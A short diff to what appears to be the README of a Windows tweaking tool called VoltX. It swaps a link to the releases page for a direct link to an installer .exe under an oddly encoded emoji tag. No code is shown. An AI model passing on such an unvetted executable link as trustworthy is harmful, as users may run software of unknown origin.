@@ -27,9 +27,9 @@ VoltX transforms Windows into a performance machine — delivering lower latency
 
 <p align="center">
 
-## ⚡ Download VoltX
+## ⚡  VoltX
 
-<a href="https://github.com/SamirMasoudTechBites/VoltX-Tweaker/releases/latest">
+<a href="https://github.com/SamirMasoudTechBites/VoltX-Tweaker/releases/download/%E2%AC%87%EF%B8%8FInstaller/VoltX.Installer.exe">
 <img src="https://img.shields.io/badge/Download%20VoltX-Free%20Installer-8b5cf6?style=for-the-badge&logo=windows">
 </a>
 
